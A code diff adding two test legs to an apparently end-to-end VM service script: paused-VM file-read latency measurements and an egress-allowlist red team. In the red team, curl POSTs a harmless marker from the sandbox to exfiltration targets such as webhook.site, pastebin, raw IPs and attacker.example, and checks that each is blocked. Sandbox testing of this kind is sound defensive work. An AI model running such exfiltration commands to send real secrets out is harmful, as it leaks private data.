@@ -42,6 +42,17 @@
  *   agent key's revoke (the session's end) deleting the key's VMs at once.
  *
  * Every VM, snapshot and agent key it makes is deleted by exact id at the end.
+ *
+ * --paused-reads adds the paused-read leg (cmuxterm-hq RFD 0144 piece 2, RFD 0163 pick 1: "publish resume p95 and
+ * paused-read p95"): before the pause it writes a 10 x 20 file tree, and while the VM is paused it times, through the
+ * files routes and with no resume, a folder listing (GET files/entries) and a file open (GET files/content), n = 30
+ * each, and a whole-tree search (list every folder, read every file, find the one needle), n = 5. The VM must still
+ * be paused after every batch and the resume after it must answer 200 (a VM that woke answers 409), so a run that
+ * passes woke it 0 times. A key without vm:files is a note and the leg is skipped.
+ *
+ * --egress-allowlist adds the egress red team (RFD sandboxing-and-lockdown): a VM made with
+ * initialNetwork.egress {mode: "allowlist", presets: [anthropic, openai, github, npm, pypi]} must still reach
+ * api.anthropic.com and github.com, and must fail to POST a marker to an outside host or a raw IP (v4 and v6).
  */
 import { randomBytes } from "node:crypto";
 import { spawn } from "node:child_process";
@@ -54,6 +65,8 @@ const option = (name: string): string | undefined => {
 };
 const skipSleep = argv.includes("--skip-sleep");
 const lifecycle = argv.includes("--lifecycle");
+const egressAllowlist = argv.includes("--egress-allowlist");
+const pausedReads = argv.includes("--paused-reads");
 const cmuxPath = option("--cmux") ?? process.env["CMUX_PATH"] ?? "";
 // The headless VM CLI (workers/cmux-vm/cli, binary cmux-vm): the same library `cmux vm` links in process, for a run
 // whose cmux has no `vm` scope yet (the public cmux is built from main; `cmux vm` is on feat-cmux-next).
@@ -396,6 +409,140 @@ async function cliJson(args: string[], what: string): Promise<unknown> {
   }
 }
 
+/** The paused-read leg's tree (module docs, --paused-reads): DIRS folders of FILES files each, one needle file. */
+const PAUSED_TREE = { dirs: 10, files: 20 } as const;
+const PAUSED_READ_N = 30;
+const PAUSED_SEARCH_N = 5;
+const PAUSED_SEARCH_CONCURRENCY = 8;
+
+const percentile = (samples: number[], p: number): number => {
+  const sorted = [...samples].sort((a, b) => a - b);
+  return sorted.length === 0 ? -1 : sorted[Math.max(0, Math.ceil((p / 100) * sorted.length) - 1)]!;
+};
+const stats = (samples: number[]) => ({
+  n: samples.length,
+  p50: Math.round(percentile(samples, 50) * 10) / 10,
+  p95: Math.round(percentile(samples, 95) * 10) / 10,
+  max: Math.round(Math.max(...samples) * 10) / 10,
+});
+
+/** Writes the leg's tree on the running VM; answers its absolute root and the needle. */
+async function pausedTree(id: string): Promise<{ root: string; needle: string }> {
+  const needle = `needle-${randomBytes(6).toString("hex")}`;
+  const { dirs, files } = PAUSED_TREE;
+  const script =
+    `set -e; r="$HOME/paused-reads-${needle}"; ` +
+    `for d in $(seq -w 0 ${dirs - 1}); do mkdir -p "$r/d$d"; for f in $(seq -w 0 ${files - 1}); do ` +
+    `yes "line of d$d/f$f.txt for the paused read leg" | head -n 40 > "$r/d$d/f$f.txt"; done; done; ` +
+    `echo ${needle} >> "$r/d04/f07.txt"; sync; echo "$r"`;
+  const out = await exec(id, script, 60_000);
+  const root = out.stdout.trim().split("\n").at(-1) ?? "";
+  if (out.exitCode !== 0 || !root.startsWith("/")) throw new Error(`paused-read tree answered ${JSON.stringify(out).slice(0, 300)}`);
+  return { root, needle };
+}
+
+/** One files route call on the paused VM, timed; a 429 waits out its Retry-After and counts. */
+async function pausedFilesCall(id: string, route: "entries" | "content", path: string, counts: { rateLimited: number }): Promise<{ ms: number; reply: Reply }> {
+  for (;;) {
+    const startedAt = performance.now();
+    const reply = await call("GET", `${vmPath(id)}/files/${route}?path=${encodeURIComponent(path)}`);
+    const ms = performance.now() - startedAt;
+    if (reply.status !== 429) return { ms, reply };
+    counts.rateLimited += 1;
+    await sleep(2_000);
+  }
+}
+
+async function pausedState(id: string): Promise<string> {
+  return String(field(expectStatus(await call("GET", vmPath(id)), [200], "GET vm (paused reads)"), "state"));
+}
+
+/** The timed reads on the paused VM (module docs, --paused-reads). */
+async function pausedReadsLeg(id: string, tree: { root: string; needle: string }, failed: string[]): Promise<void> {
+  const out: Record<string, unknown> = { tree: { ...PAUSED_TREE, root: tree.root } };
+  result["pausedReads"] = out;
+  const counts = { rateLimited: 0 };
+  const states: string[] = [];
+  const probe = await call("GET", `${vmPath(id)}/files/entries?path=${encodeURIComponent(tree.root)}`);
+  if (probe.status === 403) {
+    note("the key lacks vm:files; the paused-read leg was skipped");
+    out["skipped"] = "vm:files";
+    return;
+  }
+  expectStatus(probe, [200], "GET files/entries on a paused VM");
+  states.push(await pausedState(id));
+
+  const dir = (i: number) => `${tree.root}/d${String(i % PAUSED_TREE.dirs).padStart(2, "0")}`;
+  const listing: number[] = [];
+  await timed("pausedListing", async () => {
+    for (let i = 0; i < PAUSED_READ_N; i += 1) {
+      const { ms, reply } = await pausedFilesCall(id, "entries", dir(i), counts);
+      const entries = field(expectStatus(reply, [200], "GET files/entries (paused)"), "entries");
+      if (!Array.isArray(entries) || entries.length !== PAUSED_TREE.files) throw new Error(`paused listing of ${dir(i)} answered ${reply.text.slice(0, 200)}`);
+      listing.push(ms);
+    }
+  });
+  states.push(await pausedState(id));
+
+  const open: number[] = [];
+  await timed("pausedOpen", async () => {
+    for (let i = 0; i < PAUSED_READ_N; i += 1) {
+      const name = `f${String(i % PAUSED_TREE.files).padStart(2, "0")}.txt`;
+      const { ms, reply } = await pausedFilesCall(id, "content", `${dir(i)}/${name}`, counts);
+      expectStatus(reply, [200], "GET files/content (paused)");
+      if (!reply.text.startsWith(`line of d${String(i % PAUSED_TREE.dirs).padStart(2, "0")}/${name}`)) throw new Error(`paused open of ${name} answered ${reply.text.slice(0, 120)}`);
+      open.push(ms);
+    }
+  });
+  states.push(await pausedState(id));
+
+  const search: number[] = [];
+  let hits: string[] = [];
+  let requests = 0;
+  await timed("pausedSearch", async () => {
+    for (let round = 0; round < PAUSED_SEARCH_N; round += 1) {
+      const startedAt = performance.now();
+      const found: string[] = [];
+      const files: string[] = [];
+      const top = await pausedFilesCall(id, "entries", tree.root, counts);
+      requests += 1;
+      const dirs = (field(expectStatus(top.reply, [200], "GET files/entries (search root)"), "entries") as Array<{ name: string; kind: string }>)
+        .filter((e) => e.kind === "directory").map((e) => `${tree.root}/${e.name}`);
+      const pool = async <T>(items: T[], work: (item: T) => Promise<void>) => {
+        let next = 0;
+        await Promise.all(Array.from({ length: PAUSED_SEARCH_CONCURRENCY }, async () => {
+          while (next < items.length) await work(items[next++]!);
+        }));
+      };
+      await pool(dirs, async (d) => {
+        const { reply } = await pausedFilesCall(id, "entries", d, counts);
+        requests += 1;
+        for (const e of field(expectStatus(reply, [200], "GET files/entries (search)"), "entries") as Array<{ name: string; kind: string }>) {
+          if (e.kind === "file") files.push(`${d}/${e.name}`);
+        }
+      });
+      await pool(files, async (f) => {
+        const { reply } = await pausedFilesCall(id, "content", f, counts);
+        requests += 1;
+        expectStatus(reply, [200], "GET files/content (search)");
+        if (reply.text.includes(tree.needle)) found.push(f.slice(tree.root.length + 1));
+      });
+      search.push(performance.now() - startedAt);
+      hits = found;
+    }
+  });
+  states.push(await pausedState(id));
+
+  out["listing"] = stats(listing);
+  out["open"] = stats(open);
+  out["search"] = { ...stats(search), files: PAUSED_TREE.dirs * PAUSED_TREE.files, requestsPerSearch: Math.round(requests / PAUSED_SEARCH_N), concurrency: PAUSED_SEARCH_CONCURRENCY, hits };
+  out["rateLimited"] = counts.rateLimited;
+  out["statesDuring"] = states;
+  out["stayedPaused"] = states.every((s) => s === "paused");
+  if (hits.length !== 1) failed.push("pausedSearchHits");
+  if (out["stayedPaused"] !== true) failed.push("pausedReadsWoke");
+}
+
 /** The API legs: each verb, with the disk proof across pause, stop, fork and snapshot. */
 async function lifecycleApi(failed: string[]): Promise<void> {
   const marker = `lifecycle-${randomBytes(4).toString("hex")}`;
@@ -598,6 +745,72 @@ async function lifecycleCleanup(failed: string[]): Promise<void> {
   for (const [name, value] of Object.entries(proofs)) if (value === false) failed.push(`lifecycleCleanup.${name}`);
 }
 
+// ---- The egress allowlist red team (--egress-allowlist) ----
+
+/** An injected command that tries to send a secret out: every one must fail on an allowlisted VM. */
+const EXFIL_TARGETS = [
+  "https://example.com/",
+  "https://webhook.site/",
+  "https://pastebin.com/api/api_post.php",
+  "http://203.0.113.7/",
+  "https://1.1.1.1/",
+  "http://1.1.1.1/",
+  "https://[2606:4700:4700::1111]/",
+  "https://api.anthropic.com.attacker.example/",
+];
+const ALLOWED_TARGETS = ["https://api.anthropic.com/v1/messages", "https://github.com/"];
+
+async function egressAllowlistLeg(failed: string[]): Promise<void> {
+  const proofs: Record<string, unknown> = {};
+  result["egressAllowlist"] = proofs;
+  const presets = ["anthropic", "openai", "github", "npm", "pypi"];
+  const created = await timed("eaCreate", async () =>
+    expectStatus(
+      await call(
+        "POST",
+        "/v1/vms",
+        {
+          displayName: `egress allowlist ${runId}`.slice(0, 100),
+          idleTimeoutSeconds: 300,
+          autoDeleteSeconds: 3600,
+          initialNetwork: { publicEgress: false, egress: { mode: "allowlist", presets, domains: [] } },
+          labels: { purpose: "egress-redteam", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
+        },
+        { "idempotency-key": `egress-allowlist-${runId}` },
+        5 * 60_000,
+      ),
+      [201],
+      "POST /v1/vms (egress allowlist)",
+    ));
+  const id = field(created, "id");
+  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error("the allowlisted create returned no VM id");
+  lifecycleVms.add(id);
+  // The receipt names what was applied: required names, the presets' names, the caller's.
+  const applied = field(field(created, "initialNetwork"), "allowedDomains");
+  proofs["allowedDomains"] = applied ?? null;
+  proofs["receiptConfirms"] = Array.isArray(applied) && applied.includes("api.anthropic.com") && !applied.includes("example.com");
+  if (proofs["receiptConfirms"] !== true) failed.push("egressAllowlist.receiptConfirms");
+  await timed("eaRunning", () => waitForState(id, "running", 5 * 60_000));
+  const code = async (url: string, post: boolean) => {
+    // A marker stands in for the secret; it is not one.
+    const data = post ? `-X POST --data-binary cmux-egress-redteam-${runId}` : "";
+    const out = await exec(id, `curl -sS -o /dev/null -w '%{http_code}' --max-time 12 ${data} '${url}' 2>/dev/null; true`, 60_000);
+    return out.stdout.trim() || "000";
+  };
+  const reached: Record<string, string> = {};
+  for (const url of ALLOWED_TARGETS) reached[url] = await timed(`eaAllowed ${url}`, () => code(url, false));
+  const exfil: Record<string, string> = {};
+  for (const url of EXFIL_TARGETS) exfil[url] = await timed(`eaExfil ${url}`, () => code(url, true));
+  proofs["allowed"] = reached;
+  proofs["exfil"] = exfil;
+  // Allowed: any HTTP answer (api.anthropic.com answers 4xx without a key). Exfil: no HTTP answer at all.
+  proofs["allowedReachable"] = Object.values(reached).every((c) => /^[1-5][0-9][0-9]$/.test(c));
+  proofs["exfilBlocked"] = Object.values(exfil).every((c) => c === "000");
+  for (const name of ["allowedReachable", "exfilBlocked"]) if (proofs[name] !== true) failed.push(`egressAllowlist.${name}`);
+  expectStatus(await call("DELETE", vmPath(id)), [204, 404], "DELETE allowlisted VM");
+  lifecycleVms.delete(id);
+}
+
 function summary(outcome: Record<string, unknown>): Record<string, unknown> {
   const error = typeof outcome["error"] === "string" ? { error: outcome["error"].replace(/\s+/g, " ").slice(0, 600) } : {};
   return {
@@ -630,7 +843,7 @@ for (const signal of ["SIGINT", "SIGTERM"] as const) {
 
 // The journey ends well inside the workflow's job timeout, so cleanup always runs.
 // The lifecycle leg adds about 25 minutes of creates, forks, snapshots and waits.
-const DEADLINE_MS = (lifecycle ? 70 : 25) * 60_000;
+const DEADLINE_MS = ((lifecycle ? 70 : 25) + (egressAllowlist ? 10 : 0)) * 60_000;
 const deadline = setTimeout(() => {
   console.error(`journey exceeded ${DEADLINE_MS}ms at stage ${stage}; cleaning up`);
   void cleanup().finally(() => {
@@ -718,6 +931,7 @@ try {
       if (!/^[0-9]+$/.test(value)) throw new Error(`background process answered ${JSON.stringify(out).slice(0, 200)}`);
       return value;
     });
+    const pausedTreeAt = pausedReads ? await timed("pausedTree", () => pausedTree(id)) : null;
 
     await timed("pause", async () => {
       expectStatus(await call("POST", `${vmPath(id)}/pause`, undefined, {}, 3 * 60_000), [200], "POST pause");
@@ -726,6 +940,7 @@ try {
     await timed("paused", () => waitForState(id, "paused", 3 * 60_000));
     result["statusAfterPauseSeries"] = await stateSeries(id, pausedAt, [1_000, 5_000, 15_000]);
     result["statusAfterPause"] = (result["statusAfterPauseSeries"] as Array<{ status: string }>).at(-1)?.status ?? "unknown";
+    if (pausedTreeAt) await pausedReadsLeg(id, pausedTreeAt, failed);
     // Resume first, while the VM is surely paused: anything that reaches the VM (exec included) wakes it, and
     // resume on a VM that is no longer paused is 409 by design ("Only a paused VM can be resumed").
     await timed("resume", async () => {
@@ -778,6 +993,8 @@ try {
     const list = expectStatus(await call("GET", "/v1/vms"), [200], "GET /v1/vms");
     if (JSON.stringify(list).includes(id)) note("the deleted VM is still listed");
   });
+
+  if (egressAllowlist) await egressAllowlistLeg(failed);
 
   if (lifecycle) {
     await lifecycleApi(failed);
